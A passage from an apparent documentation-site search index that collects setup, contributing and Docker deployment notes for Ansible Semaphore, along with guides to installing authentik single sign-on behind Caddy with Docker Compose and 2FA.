--login your_login --email your-email@examaple.com --password your_password\n</code></pre>"},{"location":"Ansible%20Semaphore/#docker","title":"Docker","text":"<p><code>docker-compose.yml</code> for minimal configuration:</p> <pre><code>services:\n  semaphore:\n    ports:\n      - 3000:3000\n    image: semaphoreui/semaphore:latest\n    environment:\n      SEMAPHORE_DB_DIALECT: bolt\n      SEMAPHORE_ADMIN_PASSWORD: changeme\n      SEMAPHORE_ADMIN_NAME: admin\n      SEMAPHORE_ADMIN_EMAIL: admin@localhost\n      SEMAPHORE_ADMIN: admin\n    volumes:\n      - /path/to/data/home:/etc/semaphore # config.json location\n      - /path/to/data/lib:/var/lib/semaphore # database.boltdb location (Not required if using mysql or postgres)\n</code></pre> <p>https://hub.docker.com/r/semaphoreui/semaphore</p>"},{"location":"Ansible%20Semaphore/#demo","title":"Demo","text":"<p>You can test latest version of Semaphore on https://demo.ansible-semaphore.com.</p>"},{"location":"Ansible%20Semaphore/#docs","title":"Docs","text":"<p>Admin and user docs: https://docs.ansible-semaphore.com</p> <p>API description: https://ansible-semaphore.com/api-docs/</p>"},{"location":"Ansible%20Semaphore/#contributing","title":"Contributing","text":"<p>PR's &amp; UX reviews are welcome!</p> <p>Please follow the contribution guide. Any questions, please open an issue.</p>"},{"location":"Ansible%20Semaphore/#release-signing","title":"Release Signing","text":"<p>All releases after 2.5.1 are signed with the gpg public key <code>8CDE D132 5E96 F1D9 EABF 17D4 2C96 CF7D D27F AB82</code></p>"},{"location":"Ansible%20Semaphore/#support","title":"Support","text":"<p>If you like Ansible Semaphore, you can support the project development on Ko-fi.</p> <p></p>"},{"location":"Ansible%20Semaphore/#license","title":"License","text":"<p>MIT License</p> <p>Copyright (c) 2016 Castaway Consulting LLC</p> <p>Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:</p> <p>The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.</p> <p>THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.</p>"},{"location":"Ansible%20Semaphore/CODE_OF_CONDUCT/","title":"Contributor Covenant Code of Conduct","text":""},{"location":"Ansible%20Semaphore/CODE_OF_CONDUCT/#our-pledge","title":"Our Pledge","text":"<p>In the interest of fostering an open and welcoming environment, we as contributors and maintainers pledge to making participation in our project and our community a harassment-free experience for everyone, regardless of age, body size, disability, ethnicity, gender identity and expression, level of experience, nationality, personal appearance, race, religion, or sexual identity and orientation.</p>"},{"location":"Ansible%20Semaphore/CODE_OF_CONDUCT/#our-standards","title":"Our Standards","text":"<p>Examples of behavior that contributes to creating a positive environment include:</p> <ul> <li>Using welcoming and inclusive language</li> <li>Being respectful of differing viewpoints and experiences</li> <li>Gracefully accepting constructive criticism</li> <li>Focusing on what is best for the community</li> <li>Showing empathy towards other community members</li> </ul> <p>Examples of unacceptable behavior by participants include:</p> <ul> <li>The use of sexualized language or imagery and unwelcome sexual attention or advances</li> <li>Trolling, insulting/derogatory comments, and personal or political attacks</li> <li>Public or private harassment</li> <li>Publishing others' private information, such as a physical or electronic   address, without explicit permission</li> <li>Other conduct which could reasonably be considered inappropriate in a   professional setting</li> </ul>"},{"location":"Ansible%20Semaphore/CODE_OF_CONDUCT/#our-responsibilities","title":"Our Responsibilities","text":"<p>Project maintainers are responsible for clarifying the standards of acceptable behavior and are expected to take appropriate and fair corrective action in response to any instances of unacceptable behavior.</p> <p>Project maintainers have the right and responsibility to remove, edit, or reject comments, commits, code, wiki edits, issues, and other contributions that are not aligned to this Code of Conduct, or to ban temporarily or permanently any contributor for other behaviors that they deem inappropriate, threatening, offensive, or harmful.</p>"},{"location":"Ansible%20Semaphore/CODE_OF_CONDUCT/#scope","title":"Scope","text":"<p>This Code of Conduct applies both within project spaces and in public spaces when an individual is representing the project or its community. Examples of representing a project or community include using an official project e-mail address, posting via an official social media account, or acting as an appointed representative at an online or offline event. Representation of a project may be further defined and clarified by project maintainers.</p>"},{"location":"Ansible%20Semaphore/CODE_OF_CONDUCT/#enforcement","title":"Enforcement","text":"<p>Instances of abusive, harassing, or otherwise unacceptable behavior may be reported by contacting the project team at management@castawaylabs.com. All complaints will be reviewed and investigated and will result in a response that is deemed necessary and appropriate to the circumstances. The project team is obligated to maintain confidentiality with regard to the reporter of an incident. Further details of specific enforcement policies may be posted separately.</p> <p>Project maintainers who do not follow or enforce the Code of Conduct in good faith may face temporary or permanent repercussions as determined by other members of the project's leadership.</p>"},{"location":"Ansible%20Semaphore/CODE_OF_CONDUCT/#attribution","title":"Attribution","text":"<p>This Code of Conduct is adapted from the Contributor Covenant, version 1.4, available at http://contributor-covenant.org/version/1/4</p>"},{"location":"Ansible%20Semaphore/CONTRIBUTING/","title":"Pull Requests","text":"<p>When creating a pull-request you should:</p> <ul> <li>Open an issue first: Confirm that the change or feature will be accepted</li> <li>gofmt and vet the code: Use  <code>gofmt</code>, <code>golint</code>, <code>govet</code> and <code>goimports</code> to clean up your code.</li> <li>vendor dependencies with dep: Use <code>dep ensure --update</code> if you have added to or updated dependencies, so that they get added to the dependency manifest.</li> <li>Update api documentation: If your pull-request adding/modifying an API request, make sure you update the swagger documentation (<code>api-docs.yml</code>)</li> <li>Run Api Tests: If your pull request modifies the API make sure you run the integration tests using dredd.</li> </ul>"},{"location":"Ansible%20Semaphore/CONTRIBUTING/#installation-in-a-development-environment","title":"Installation in a development environment","text":"<ul> <li>Check out the <code>develop</code> branch</li> <li>Install Go. Go must be &gt;= v1.10 for all the tools we use to work</li> <li>Install MySQL / MariaDB (OPTIONAL!!!)</li> <li>Install node.js</li> </ul> <p>1) Set up GOPATH, GOBIN and Workspace.</p> <pre><code>mkdir -p $GOPATH/src/github.com/ansible-semaphore &amp;&amp; cd $GOPATH/src/github.com/ansible-semaphore\n</code></pre> <p>2) Clone semaphore (with submodules)</p> <pre><code>git clone --recursive git@github.com:ansible-semaphore/semaphore.git &amp;&amp; cd semaphore\n</code></pre> <p>3) Install dev dependencies</p> <pre><code>go install github.com/go-task/task/v3/cmd/task@latest\ntask deps\n</code></pre> <p>Windows users will additionally need to manually install goreleaser from https://github.com/goreleaser/goreleaser/releases</p> <p>4) Create database if you want to use MySQL (Semaphore also supports bbolt, it doesn't require additional action) </p> <pre><code>echo \"create database semaphore;\" | mysql -uroot -p\n</code></pre> <p>5) Compile, set up &amp; run</p> <pre><code>task compile\ngo run cli/main.go setup\ngo run cli/main.go service --config ./config.json\n</code></pre> <p>Open localhost:3000</p> <p>Note: for Windows, you may need Cygwin to run certain commands because the reflex package probably doesn't work on Windows.  You may encounter issues when running <code>task watch</code>, but running <code>task build</code> etc... will still be OK.</p>"},{"location":"Ansible%20Semaphore/CONTRIBUTING/#integration-tests","title":"Integration Tests","text":"<p>Dredd is used for API integration tests, if you alter the API in any way you must make sure that the information in the api docs matches the responses.</p> <p>As Dredd and the application database config may differ it expects it's own config.json in the .dredd folder. The most basic configuration for this using a local docker container to run the database would be</p> <pre><code>{\n    \"mysql\": {\n        \"host\": \"0.0.0.0:3306\",\n        \"user\": \"semaphore\",\n        \"pass\": \"semaphore\",\n        \"name\": \"semaphore\"\n    }\n}\n</code></pre>"},{"location":"Ansible%20Semaphore/deployment/docker/Readme/","title":"Docker Deployments","text":"<p>Production images for each tag, latest and the development branch will be pushed to docker hub. To build images locally see the contexts included here and use the <code>d</code> and <code>dc</code> tasks in the root Taskfile.yml to help with building and running.</p>"},{"location":"Ansible%20Semaphore/deployment/docker/Readme/#contexts","title":"Contexts","text":""},{"location":"Ansible%20Semaphore/deployment/docker/Readme/#prod","title":"Prod","text":"<p>To build a production image you should run</p> <pre><code>context=prod task docker:build\n</code></pre> <p>this will create an image called <code>semaphoreui/semaphore:latest</code> which will be compiled from the currently checked out code</p> <p>This image is run as non root user 1001 (for PaaS systems such as openshift) and is build on alpine with added glibc. With ansible etc... installed in the container it is ~283MiB in size.</p> <p>You will need to provide environmental variables so that the configuration can be built correctly for your environment. See <code>docker-compose.yml</code> for an example, or look at <code>../common/entrypoint</code> to see which variables are available</p> <p>If you want to bulid an image with a custom tag you can optionally pass a tag to the command</p> <pre><code>context=prod tag=mybranch task docker:build\n</code></pre>"},{"location":"Ansible%20Semaphore/deployment/docker/Readme/#example-configuration","title":"Example Configuration","text":"<p>To run Semaphore in a simple production-like docker configuration run the following command:</p> <pre><code>task dc:prod\n</code></pre> <p>You can then access Semaphore directly from the url http://localhost:8081/</p>"},{"location":"Ansible%20Semaphore/deployment/docker/Readme/#ssl-termination-using-nginx","title":"SSL Termination Using Nginx","text":"<p>Generate a cert, ca cert, and key file and place into <code>prod/proxy/cert/</code> with these names:</p> <ul> <li><code>cert.pem</code></li> <li><code>privkey.pem</code></li> <li><code>fullchain.pem</code></li> </ul> <p>(I've used letsencrypt generated certs with success.)</p> <p>Run <code>task dc:prod</code> and your Semaphore instance will then be at the url https://localhost:8443</p> <p>If you do not add certificates the container will create self-signed certs instead</p>"},{"location":"Ansible%20Semaphore/deployment/docker/Readme/#dev","title":"Dev","text":"<p>To start a development start you could run</p> <pre><code>context=dev task dc:up\n</code></pre> <p>The development stack will run <code>task watch</code> by default and <code>dc:up</code> will volume link the application in to the container. Without <code>dc:up</code> the application will run the version of the application which existed at image build time.</p> <p>The development container is based on micro-golang's test base image which contains the go toolchain and glibc in alpine.</p> <p>Because the test image links your local volume it expects that you have run <code>task deps</code> and <code>task compile</code> locally  as necessary to make the application usable.</p>"},{"location":"Ansible%20Semaphore/deployment/docker/Readme/#ci","title":"CI","text":"<p>This context is a proxyless stack used to test the API in the ci. Essentially it just installs the app, adds a few bootstrapping files and starts up so that dredd can be run against it. This should not be used in production as it does not remove the build toolchain, or source code. It is more advisable to use the dev context locally as it volume links the application directory and defaults to the watch task.</p>"},{"location":"Ansible%20Semaphore/deployment/docker/Readme/#convenience-functions","title":"Convenience Functions","text":""},{"location":"Ansible%20Semaphore/deployment/docker/Readme/#dcdev","title":"dc:dev","text":"<p><code>dc:dev</code> rebuilds the development images and runs a development stack, with the semaphore root as a volume link This allows you to work inside the container with live code. The container has all the tools you need to build and test semaphore</p>"},{"location":"Ansible%20Semaphore/deployment/docker/Readme/#dcprod","title":"dc:prod","text":"<p><code>dc:prod</code> rebuilds the production example images and starts the production-like stack.  This will compile the application for the currently checked out code but will not leave build tools or source in the container. Therefore file changes will result in needing a rebuild.</p>"},{"location":"Ansible%20Semaphore/deployment/docker/common/","title":"semaphore-wrapper","text":""},{"location":"Ansible%20Semaphore/deployment/docker/common/#what-it-does","title":"What it does","text":"<p><code>semaphore-wrapper</code> generates <code>config.json</code> using <code>setup</code> command and execute provided command.</p>"},{"location":"Ansible%20Semaphore/deployment/docker/common/#how-to-test-semaphore-wrapper","title":"How to test semaphore-wrapper","text":"<pre><code>SEMAPHORE_DB_DIALECT=bolt \\\nSEMAPHORE_CONFIG_PATH=/tmp/semaphore \\\nSEMAPHORE_DB_HOST=/tmp/semaphore \\\n./semaphore-wrapper ../../../bin/semaphore server --config /tmp/semaphore/config.json\n</code></pre>"},{"location":"Ansible%20Semaphore/deployment/systemd/","title":"Systemd","text":"<p>This is a sample systemd unit and environment file that you could use to run Semaphore with. It makes no assumptions about running proxies or databases on the same machine,  therefore if you do this you may wish to add addition requirements to the unit. The unit will write logs to the journal which you can read with <code>journalctl -u semaphore.service</code></p> <p>Example install, and for convenience uninstall, scripts are located in the util subdir.  The scripts expect that you manually install semaphore in /usr/bin and have the config file  /etc/semaphore/config.json. The config file location can be altered via the env file,  which the script installs as /etc/semaphore/env</p>"},{"location":"Ansible%20Semaphore/web/","title":"web","text":""},{"location":"Ansible%20Semaphore/web/#project-setup","title":"Project setup","text":"<pre><code>npm install\n</code></pre>"},{"location":"Ansible%20Semaphore/web/#compiles-and-hot-reloads-for-development","title":"Compiles and hot-reloads for development","text":"<pre><code>npm run serve\n</code></pre>"},{"location":"Ansible%20Semaphore/web/#compiles-and-minifies-for-production","title":"Compiles and minifies for production","text":"<pre><code>npm run build\n</code></pre>"},{"location":"Ansible%20Semaphore/web/#run-your-unit-tests","title":"Run your unit tests","text":"<pre><code>npm run test:unit\n</code></pre>"},{"location":"Ansible%20Semaphore/web/#lints-and-fixes-files","title":"Lints and fixes files","text":"<pre><code>npm run lint\n</code></pre>"},{"location":"Ansible%20Semaphore/web/#customize-configuration","title":"Customize configuration","text":"<p>See Configuration Reference.</p>"},{"location":"Apuntes/apuntes/","title":"Index","text":""},{"location":"Apuntes/apuntes/#instalacion","title":"Instalaci\u00f3n","text":"<pre><code>(myenv) pip install Sphinx sphinx-rtd-theme sphinx-autobuild -U\n\ngit clone https://github.com/snicoper/apuntes.git\n\ncd apuntes/\n\nmake html\n\nfirefox _build/html/index.html\n\n# Live preview\nmake livehtml\n</code></pre>"},{"location":"Apuntes/apuntes/LICENSE/","title":"LICENSE","text":"<p>Esta obra est\u00e1 bajo una Licencia Creative Commons Atribuci\u00f3n-NoComercial 4.0 Internacional.</p> <p>https://creativecommons.org/licenses/by-nc/4.0/</p>"},{"location":"Authentik/ExternalDoc/","title":"authentik: Authentication, SSO, User Management &amp; Password Reset for Home Networks","text":""},{"location":"Authentik/ExternalDoc/#contents","title":"Contents","text":"<ul> <li>Preparation</li> <li>What is authentik?</li> <li>authentik vs. Authelia/lldap</li> <li>authentik Pros</li> <li>authentik Cons</li> <li>Dockerized authentik Directory Structure</li> <li>authentik Docker Compose File</li> <li>authentik container-vars.env File</li> <li>Generate Passwords</li> <li>Additional Container Environment Variables</li> <li>Start the authentik Container</li> <li>authentik Let\u2019s Encrypt Certificate via Caddy</li> <li>Caddyfile</li> <li>DNS A Record</li> <li>Reload Caddy\u2019s Configuration</li> <li>authentik: Initial Configuration</li> <li>Create Your authentik User Account</li> <li>Add 2FA to Your authentik User Account</li> <li>Add a Protected Application</li> <li>authentik: Create a Proxy Provider</li> <li>authentik: Create an Application</li> <li>authentik: Add Application to Outpost</li> <li>Caddy: Add Forward Authentication</li> <li>Caddy: Reload Configuration</li> </ul> <p>Resources</p> <p>This is my second article on how to set up a modern user management  and authentication system for services on your internal home network. In the previous article, I used Authelia as IdP. I looked for an alternative and explored  authentik because I had some trouble getting OpenID Connect to work with Authelia. I figured it out eventually, but in the meantime, I\u2019d already completed the authentik configuration, so here is the documentation of  an alternative SSO implementation.</p> <p>The solution presented here supports important security features like two-factor authentication and single sign-on, and only requires minimal maintenance due to self-service password reset. This article is part of my series on home automation that shows how to install, configure, and run a home server with  (dockerized or virtualized) services such as Home Assistant and  ownCloud.</p> <p></p>"},{"location":"Authentik/ExternalDoc/#preparation","title":"Preparation","text":"<p>I\u2019m assuming that you\u2019ve set up Docker and the Caddy container as described in the previous articles in this series.</p>"},{"location":"Authentik/ExternalDoc/#what-is-authentik","title":"What is authentik?","text":"<p>authentik is an open-source identity provider with an integrated user directory.  authentik supports OpenID Connect as well as LDAP and enables use cases  such as authentication, enrollment, and self-service.</p>"},{"location":"Authentik/ExternalDoc/#authentik-vs-authelialldap","title":"authentik vs. Authelia/lldap","text":"<p>Authelia/lldap and authentik provide similar services. For the purposes of home  automation, both can be used interchangeably. Before we dive into  authentik\u2019s configuration, let\u2019s start by looking at some of the pros  and cons of authentik as compared to Authelia.</p>"},{"location":"Authentik/ExternalDoc/#authentik-pros","title":"authentik Pros","text":"<ul> <li>Integrated product combining a user directory with an identity and access management server (IAM).</li> <li>OpenID Connect support is more mature than Authelia\u2019s.</li> <li>Decent web-based admin UI, although a little buggy in places.</li> </ul>"},{"location":"Authentik/ExternalDoc/#authentik-cons","title":"authentik Cons","text":"<ul> <li>authentik\u2019s Docker image is much larger than Authelia\u2019s and lldap\u2019s combined (690 MB vs. 108 MB).</li> <li>authentik needs more CPU &amp; RAM resources.</li> </ul>"},{"location":"Authentik/ExternalDoc/#dockerized-authentik-directory-structure","title":"Dockerized authentik Directory Structure","text":"<p>This is what the directory structure will look like when we\u2019re done:</p> <pre><code>rpool/\n \u2514\u2500\u2500 encrypted/\n     \u2514\u2500\u2500 docker/\n         \u2514\u2500\u2500 authentik/\n             \u251c\u2500\u2500 certs/\n             \u251c\u2500\u2500 db/\n             \u251c\u2500\u2500 media/\n             \u251c\u2500\u2500 redis/\n             \u251c\u2500\u2500 templates/\n             \u251c\u2500\u2500 container-vars.env\n             \u2514\u2500\u2500 docker-compose.yml\n</code></pre> <p>We\u2019re placing the configuration on the encrypted ZFS dataset (<code>rpool/encrypted</code>).</p> <p>Create the directories and set their owners to user/group ID 1000, which are used by dockerized authentik (docs):</p> <pre><code>mkdir -p /rpool/encrypted/docker/authentik/certs\nmkdir -p /rpool/encrypted/docker/authentik/db\nmkdir -p /rpool/encrypted/docker/authentik/media\nmkdir -p /rpool/encrypted/docker/authentik/redis\nmkdir -p /rpool/encrypted/docker/authentik/templates\nchown -Rfv 1000:1000 /rpool/encrypted/docker/authentik/certs\nchown -Rfv 1000:1000 /rpool/encrypted/docker/authentik/media\nchown -Rfv 1000:1000 /rpool/encrypted/docker/authentik/templates\n</code></pre>"},{"location":"Authentik/ExternalDoc/#authentik-docker-compose-file","title":"authentik Docker Compose File","text":"<p>Create <code>docker-compose.yml</code> with the following content, which is my modified version of the original:</p> <pre><code>version: '3.9'\n\nservices:\n\n  authentik-postgresql:\n    container_name: authentik-postgresql\n    hostname: authentik-postgresql\n    image: postgres:12-alpine\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -d $${POSTGRES_DB} -U $${POSTGRES_USER}\"]\n      start_period: 20s\n      interval: 30s\n      retries: 5\n      timeout: 5s\n    networks:\n      - backend         # internal communications\n    env_file:\n      - container-vars.env\n    volumes:\n      - ./db:/var/lib/postgresql/data\n\n  authentik-redis:\n    container_name: authentik-redis\n    hostname: authentik-redis\n    image: redis:alpine\n    command: --save 60 1 --loglevel warning\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD-SHELL\", \"redis-cli ping | grep PONG\"]\n      start_period: 20s\n      interval: 30s\n      retries: 5\n      timeout: 3s\n    networks:\n      - backend         # internal communications\n    volumes:\n      - ./redis:/data\n\n  authentik:\n    container_name: authentik\n    hostname: authentik\n    image: ghcr.io/goauthentik/server:latest\n    restart: unless-stopped\n    command: server\n    networks:\n      - backend         # internal communications\n      - caddy_caddynet  # external communications\n    expose:\n      - 9000            # HTTP\n      - 9443            # HTTPS\n    env_file:\n      - container-vars.env\n    volumes:\n      - ./media:/media\n      - ./templates:/templates\n\n  authentik-worker:\n    container_name: authentik-worker\n    hostname: authentik-worker\n    image: ghcr.io/goauthentik/server:latest\n    restart: unless-stopped\n    command: worker\n    networks:\n      - backend         # internal communications\n    env_file:\n      - container-vars.env\n    volumes:\n      - ./media:/media\n      - ./certs:/certs\n      - ./templates:/templates\n\nnetworks:\n\n  backend:\n    driver: bridge\n  caddy_caddynet:\n    external: true\n</code></pre>"},{"location":"Authentik/ExternalDoc/#authentik-container-varsenv-file","title":"authentik container-vars.env File","text":""},{"location":"Authentik/ExternalDoc/#generate-passwords","title":"Generate Passwords","text":"<p>Generate random alphanumeric strings and store them as container environment variables in <code>container-vars.env</code>:</p> <pre><code>cd /rpool/encrypted/docker/authentik/\necho \"POSTGRES_PASSWORD=$(tr -cd '[:alnum:]' &lt; /dev/urandom | fold -w \"64\" | head -n 1)\" &gt;&gt; container-vars.env\necho \"AUTHENTIK_SECRET_KEY=$(tr -cd '[:alnum:]' &lt; /dev/urandom | fold -w \"64\" | head -n 1)\" &gt;&gt; container-vars.env\n</code></pre>"},{"location":"Authentik/ExternalDoc/#additional-container-environment-variables","title":"Additional Container Environment Variables","text":"<p>Edit <code>container-vars.env</code> so that it looks like the following:</p> <pre><code># Secrets\nPOSTGRES_PASSWORD=YOUR_PASSWORD_HERE\nAUTHENTIK_SECRET_KEY=YOUR_PASSWORD_HERE\n\n# Postgres\nPOSTGRES_DB=authentik\nPOSTGRES_USER=authentik\n\n# authentik\nAUTHENTIK_AVATARS=none                               # disable connections to Gravatar\nAUTHENTIK_REDIS__HOST=redis\nAUTHENTIK_POSTGRESQL__HOST=authentik-postgresql\nAUTHENTIK_POSTGRESQL__USER=authentik\nAUTHENTIK_POSTGRESQL__NAME=authentik\nAUTHENTIK_POSTGRESQL__PASSWORD=${POSTGRES_PASSWORD}\n\n# Email\nAUTHENTIK_EMAIL__HOST=smtp.sendgrid.net              # replace with your SMTP server's FQDN\nAUTHENTIK_EMAIL__PORT=587                            # replace with your SMTP server's port\nAUTHENTIK_EMAIL__USERNAME=apikey                     # replace with your SMTP server's username\nAUTHENTIK_EMAIL__PASSWORD=YOUR_PASSWORD_HERE\nAUTHENTIK_EMAIL__FROM=\"Your Name &lt;name@domain.com&gt;\"  # replace with your name/email\nAUTHENTIK_EMAIL__USE_TLS=true\n</code></pre>"},{"location":"Authentik/ExternalDoc/#start-the-authentik-container","title":"Start the authentik Container","text":"<p>Navigate into the directory with <code>docker-compose.yml</code> and run:</p> <pre><code>docker compose up -d\n</code></pre> <p>Inspect the container logs for errors with the command <code>docker compose logs --tail 30 --timestamps</code>.</p>"},{"location":"Authentik/ExternalDoc/#authentik-lets-encrypt-certificate-via-caddy","title":"authentik Let\u2019s Encrypt Certificate via Caddy","text":""},{"location":"Authentik/ExternalDoc/#caddyfile","title":"Caddyfile","text":"<p>Add the following to <code>Caddyfile</code> (details):</p> <pre><code>auth.{$MY_DOMAIN} {\n    reverse_proxy authentik:9000\n    tls {\n        dns cloudflare {env.CLOUDFLARE_API_TOKEN}\n    }\n}\n</code></pre>"},{"location":"Authentik/ExternalDoc/#dns-a-record","title":"DNS A Record","text":"<p>Add the following A record to your DNS domain:</p> <pre><code>auth.home.yourdomain.com 192.168.0.4     # replace with your Docker host's IP address\n</code></pre> <p>Try to resolve the name on a machine in your network (e.g., <code>nslookup auth.home.yourdomain.com</code>). If that fails, you might need to work around DNS rebind protection in your router.</p>"},{"location":"Authentik/ExternalDoc/#reload-caddys-configuration","title":"Reload Caddy\u2019s Configuration","text":"<p>Instruct Caddy to reload its configuration by running:</p> <pre><code>docker exec -w /etc/caddy caddy caddy reload\n</code></pre> <p>You should now be able to access the authentik web interface at <code>https://auth.home.yourdomain.com</code> without getting a certificate warning from your browser.</p>"},{"location":"Authentik/ExternalDoc/#authentik-initial-configuration","title":"authentik: Initial Configuration","text":"<p>In your browser, navigate to authentik\u2019s initial setup page <code>https://auth.home.yourdomain.com/if/flow/initial-setup/</code>.</p> <p>Set the email and password for the default admin user, <code>akadmin</code>. You\u2019re now logged in.</p>"},{"location":"Authentik/ExternalDoc/#create-your-authentik-user-account","title":"Create Your authentik User Account","text":"<p>In the top-right corner of authentik\u2019s web UI, click Admin interface. Navigate to Directory &gt; Users and create a new user account for yourself (make sure to fill out the <code>email</code> field correctly). Add your account to the group <code>authentik Admins</code>. Once the user is created, set a password.</p>"},{"location":"Authentik/ExternalDoc/#add-2fa-to-your-authentik-user-account","title":"Add 2FA to Your authentik User Account","text":"<p>Log in with your authentik user account at <code>https://auth.home.yourdomain.com/</code>, click on the cog wheel in the upper-right corner, select MFA Devices and click Enroll &gt; TOTP authenticator. Scan the QR code in your authenticator app (e.g., Authy).</p> <p>Click Enroll again and now select Static authenticator. authentik displays a dialog with 2FA recovery keys. Copy the keys and store them in your password manager.</p>"},{"location":"Authentik/ExternalDoc/#add-a-protected-application","title":"Add a Protected Application","text":"<p>The easiest way to integrate authentik with Caddy is via authentik\u2019s domain-level forward authentication. We\u2019ll use the <code>whoami</code> container from this previous article to demonstrate how that works.</p> <p>In the top-right corner of authentik\u2019s web UI, click Admin interface.</p>"},{"location":"Authentik/ExternalDoc/#authentik-create-a-proxy-provider","title":"authentik: Create a Proxy Provider","text":"<p>Navigate to Applications &gt; Providers. Create a new Proxy Provider with the following settings:</p> <ul> <li>Name: Home forward auth</li> <li>Authorization flow: default-provider-authorization-explicit-consent</li> <li>Type: Forward auth (domain level)</li> <li>Authentication URL: <code>https://auth.home.yourdomain.com</code></li> <li>Cookie domain: <code>home.yourdomain.com</code></li> </ul>"},{"location":"Authentik/ExternalDoc/#authentik-create-an-application","title":"authentik: Create an Application","text":"<p>Navigate to Applications &gt; Applications. Create a new Application with the following settings:</p> <ul> <li>Name: Home</li> <li>Provider: Home forward auth</li> <li>Launch URL: <code>blank://blank</code> (this hides the application in the library page, \u201cmy applications\u201d)</li> </ul>"},{"location":"Authentik/ExternalDoc/#authentik-add-application-to-outpost","title":"authentik: Add Application to Outpost","text":"<p>Navigate to Applications &gt; Outposts. Edit the <code>authentik Embedded Outpost</code> and make sure that the entry for the application <code>Home</code> in the field Applications is selected.</p>"},{"location":"Authentik/ExternalDoc/#caddy-add-forward-authentication","title":"Caddy: Add Forward Authentication","text":"<p>We\u2019ll define a generic snipped that can be used with any application to be protected by authentik. Add the following to <code>Caddyfile</code> (details):</p> <pre><code>(authentik) {\n    # Always forward outpost path to actual outpost\n    reverse_proxy /outpost.goauthentik.io/* http://authentik:9000\n\n    # Forward authentication to outpost\n    forward_auth http://authentik:9000 {\n        uri /outpost.goauthentik.io/auth/caddy\n\n        # Capitalization of the headers is important, otherwise they will be empty\n        copy_headers X-Authentik-Username X-Authentik-Groups X-Authentik-Email X-Authentik-Name X-Authentik-Uid X-Authentik-Jwt X-Authentik-Meta-Jwks X-Authentik-Meta-Outpost X-Authentik-Meta-Provider X-Authentik-Meta-App X-Authentik-Meta-Version\n    }\n}\n</code></pre> <p>To protect an application endpoint with authentik, simply add the following directive to its <code>Caddyfile</code> configuration:</p> <pre><code>import authentik\n</code></pre> <p>The complete Caddy configuration for <code>whoami</code> looks as follows:</p> <pre><code>whoami.{$MY_DOMAIN} {\n    import authentik\n    reverse_proxy whoami:80\n    tls {\n        dns cloudflare {env.CLOUDFLARE_API_TOKEN}\n    }\n}\n</code></pre>"},{"location":"Authentik/ExternalDoc/#caddy-reload-configuration","title":"Caddy: Reload Configuration","text":"<p>Instruct Caddy to reload its configuration by running:</p> <pre><code>docker exec -w /etc/caddy caddy caddy reload\n</code></pre> <p>When you now try to access the <code>whoami</code> application at <code>https://whoami.home.yourdomain.com</code> you\u2019ll get an authentication prompt from authentik.</p>"},{"location":"Authentik/ExternalDoc/#_1","title":"authentik: Authentication, SSO, User Management &amp; Password Reset for Home Networks","text":""},{"location":"Authentik/authetikDoc/","title":"Docker Compose installation","text":"<p>This installation method is for test-setups and small-scale production setups.</p>"},{"location":"Authentik/authetikDoc/#requirements","title":"Requirements","text":"<ul> <li>A host with at least 2 CPU cores and 2 GB of RAM</li> <li>Docker</li> <li>Docker Compose</li> </ul>"},{"location":"Authentik/authetikDoc/#preparation","title":"Preparation","text":"<p>Download the latest <code>docker-compose.yml</code> from here. Place it in a directory of your choice.</p> <p>If this is a fresh authentik install run the following commands to generate a password:</p> <pre><code># You can also use openssl instead: `openssl rand -base64 36`\nsudo apt-get install -y pwgen\n# Because of a PostgreSQL limitation, only passwords up to 99 chars are supported\n# See https://www.postgresql.org/message-id/09512C4F-8CB9-4021-B455-EF4C4F0D55A0@amazon.com\necho \"PG_PASS=$(pwgen -s 40 1)\" &gt;&gt; .env\necho \"AUTHENTIK_SECRET_KEY=$(pwgen -s 50 1)\" &gt;&gt; .env\n# Skip if you don't want to enable error reporting\necho \"AUTHENTIK_ERROR_REPORTING__ENABLED=true\" &gt;&gt; .env\n</code></pre>"},{"location":"Authentik/authetikDoc/#email-configuration-optional-but-recommended","title":"Email configuration (optional, but recommended)","text":"<p>It is also recommended to configure global email credentials. These are used by authentik to notify you about alerts and configuration issues. They can also be used by Email stages to send verification/recovery emails.</p> <p>To configure email credentials, append this block to your <code>.env</code> file</p> <pre><code># SMTP Host Emails are sent to\nAUTHENTIK_EMAIL__HOST=localhost\nAUTHENTIK_EMAIL__PORT=25\n# Optionally authenticate (don't add quotation marks to your password)\nAUTHENTIK_EMAIL__USERNAME=\nAUTHENTIK_EMAIL__PASSWORD=\n# Use StartTLS\nAUTHENTIK_EMAIL__USE_TLS=false\n# Use SSL\nAUTHENTIK_EMAIL__USE_SSL=false\nAUTHENTIK_EMAIL__TIMEOUT=10\n# Email address authentik will send from, should have a correct @domain\nAUTHENTIK_EMAIL__FROM=authentik@localhost\n</code></pre>"},{"location":"Authentik/authetikDoc/#configure-for-port-80443","title":"Configure for port 80/443","text":"<p>By default, authentik listens on port 9000 for HTTP and 9443 for HTTPS. To change the default and instead use ports 80 and 443, you can set the following variables in <code>.env</code>:</p> <pre><code>AUTHENTIK_PORT_HTTP=80\nAUTHENTIK_PORT_HTTPS=443\n</code></pre> <p>Be sure to run <code>docker-compose up -d</code> to rebuild with the new port numbers.</p>"},{"location":"Authentik/authetikDoc/#startup","title":"Startup","text":"<p>Afterwards, run these commands to finish:</p> <pre><code>docker-compose pull\ndocker-compose up -d\n</code></pre> <p>The <code>docker-compose.yml</code> file statically references the latest version available at the time of downloading the compose file. Each time you upgrade to a newer version of authentik, you download a new <code>docker-compose.yml</code> file, which points to the latest available version. For more information, refer to the Upgrading section in the Release Notes.</p> <p>By default, authentik is reachable (by default) on port 9000 (HTTP) and port 9443 